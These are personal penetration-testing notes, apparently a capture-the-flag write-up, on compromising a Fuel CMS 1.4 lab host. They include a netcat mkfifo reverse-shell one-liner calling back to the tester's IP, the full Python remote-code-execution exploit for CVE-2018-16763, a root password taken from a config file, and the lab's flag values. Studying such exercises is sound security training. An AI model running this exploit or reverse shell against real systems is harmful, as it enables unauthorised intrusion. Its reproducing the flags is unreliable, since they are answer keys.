Use this template in Obsidian to register your findings per target.

---
## 🖥️ Target System: `IP/Hostname`


<summary>1. 🧭 Initial Reconnaissance</summary>

- **Tools Used**: ping, nmap
- **Host Discovery**:
  - Was the host alive? Yes
  - Ping Response:

![[Pasted image 20250629115402.png]]

- **Port Scan Results**:
  - Open Ports:
  - Service Versions:
  - OS Detection:

![[port_scan 2.txt]]

![[Pasted image 20250629115517.png]]

---

<summary>2. 📂 Enumeration</summary>

- **Ports/Services Analyzed**: 
- **Tools Used**: webrowser, searchsploit, gobuster
- **Findings**:
  - Directories found:
  - Enumerated users/accounts:
  - Software versions:
	- Fuel CMS version 1.4
- **Screenshots/Proof**:

![[directories.txt]]

![[Pasted image 20250629120047.png]]

searchspliot

Exploit Title                                                                                                                          |  Path
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
AMD Fuel Service - 'Fuel.service' Unquote Service Path                                                                                  | windows/local/49535.txt
Franklin Fueling Systems  TS-550 - Exploit and Default Password                                                                         | hardware/remote/51321.txt
Franklin Fueling Systems Colibri Controller Module 1.8.19.8580 - Local File Inclusion (LFI)                                             | linux/remote/50861.txt
Franklin Fueling Systems TS-550 - Default Password                                                                                      | hardware/remote/51382.txt
Franklin Fueling TS-550 evo 2.0.0.6833 - Multiple Vulnerabilities                                                                       | hardware/webapps/31180.txt
fuel CMS 1.4.1 - Remote Code Execution (1)                                                                                              | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                                                                              | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                                                                              | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                                                                             | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                                                                    | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                                                                        | php/webapps/48778.txt
Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)                                                                                      | php/webapps/50884.txt

![[Pasted image 20250629120211.png]]

---

<summary>3. 🚨 Vulnerability Analysis</summary>

- **Identified Vulnerabilities**: 
  - Description: Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)
  - CVE/Exploit DB Ref: [2018-16763](https://nvd.nist.gov/vuln/detail/CVE-2018-16763)
- **Tool(s) Used**: 

- python3 50477.py -u http://10.10.230.102/

![[Pasted image 20250629121047.png]]

- from https://www.revshells.com/ nc mkfifo: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.102.108 9001 >/tmp/f

 ![[Pasted image 20250629121128.png]]
 
 
- **Proof/Output**:
  - Command results, error messages, etc.

---


<summary>4. 💣 Exploitation</summary>

- **Tool(s) Used**: netcat
- **Exploit/Payload**:
  - Command: 
- **Result**:
	
	- on local machine `nc -lvnp 9001
	
	got into webserver using a revershell
	
	![[Pasted image 20250629121216.png]]
	
	find / -name flag.txt - /home/www-data/flag.txt
	cat /home/www-data/flag.txt - 6470e394cbf6dab6a91682cc8585059b
	
- **Post-Exploitation Notes**:
  - E.g., accessed user.txt
- **Proof**:

![[Pasted image 20250629122323.png]]

---

<summary>5. 🪜 Privilege Escalation</summary>

- **Initial Access Level**: www-data
- **Techniques Tried**: access fuel folder to check php configuration
- **Success Path**:
  - Commands used: 

![[Pasted image 20250629122651.png]]

![[Pasted image 20250629122623.png]]

![[Pasted image 20250629122717.png]]

username: root
password: mememe

![[Pasted image 20250629122859.png]]

- **Root Access?** (Yes)
- **Proof**:

![[Pasted image 20250629122926.png]]

---

<summary>6. 🗃️ Post-Exploitation</summary>

- **Files/Flags Accessed**:

www-data:

flag.txt - 6470e394cbf6dab6a91682cc8585059b

Root:

	find / -name root.txt - /root/root.txt

	cat /root/root.txt - b9bbcb33e11b80be759c4e844862482d

flag.txt - b9bbcb33e11b80be759c4e844862482d 

- **Sensitive Data Found**:

  - Passwords: mememe (root)
  - config files: /var/www/html/fuel/application/config$ cat database.php

- **Users Compromised**: root

---

<summary>7. 📓 Lessons Learned</summary>

- **What Worked**:
	- nc using exploit file php/webapps/50477.py
	- checking fuel config folder
	- accessing database.php
	
- **What Didn’t**:
	- trying to inject code inside the cms to get reverse shell
- **To Improve**:

---

Python script:

# Exploit Title: Fuel CMS 1.4.1 - Remote Code Execution (3)
# Exploit Author: Padsala Trushal
# Date: 2021-11-03
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763

#!/usr/bin/python3

import requests
from urllib.parse import quote
import argparse
import sys
from colorama import Fore, Style

def get_arguments():
	parser = argparse.ArgumentParser(description='fuel cms fuel CMS 1.4.1 - Remote Code Execution Exploit',usage=f'python3 {sys.argv[0]} -u <url>',epilog=f'EXAMPLE - python3 {sys.argv[0]} -u http://10.10.21.74')

	parser.add_argument('-v','--version',action='version',version='1.2',help='show the version of exploit')

	parser.add_argument('-u','--url',metavar='url',dest='url',help='Enter the url')

	args = parser.parse_args()

	if len(sys.argv) <=2:
		parser.print_usage()
		sys.exit()

	return args


args = get_arguments()
url = args.url

if "http" not in url:
	sys.stderr.write("Enter vaild url")
	sys.exit()

try:
   r = requests.get(url)
   if r.status_code == 200:
       print(Style.BRIGHT+Fore.GREEN+"[+]Connecting..."+Style.RESET_ALL)


except requests.ConnectionError:
    print(Style.BRIGHT+Fore.RED+"Can't connect to url"+Style.RESET_ALL)
    sys.exit()

while True:
	cmd = input(Style.BRIGHT+Fore.YELLOW+"Enter Command $"+Style.RESET_ALL)

	main_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+quote(cmd)+"%27%29%2b%27"

	r = requests.get(main_url)

	#<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

	output = r.text.split('<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">')
	print(output[0])
	if cmd == "exit":
		break